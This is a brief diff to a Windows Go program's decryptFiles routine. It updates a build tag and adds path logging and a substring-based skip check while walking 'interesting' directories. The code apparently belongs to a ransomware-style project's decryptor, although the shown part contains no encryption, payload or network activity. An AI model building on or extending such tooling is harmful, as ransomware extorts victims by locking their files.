@@ -1,5 +1,5 @@
 // +build windows
-// +build go1.7
+// +build go1.8
 
 package main
 
@@ -72,7 +72,10 @@ func decryptFiles(key string) {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
-				if utils.StringInSlice(filepath.Base(path), cmd.SkippedDirs) {
+				// we doesn't care about the err returned here
+				cmd.Logger.Println("Walking " + path)
+
+				if utils.SliceContainsSubstring(filepath.Base(path), cmd.SkippedDirs) {
 					cmd.Logger.Printf("Skipping dir %s", path)
 					return filepath.SkipDir
 				}
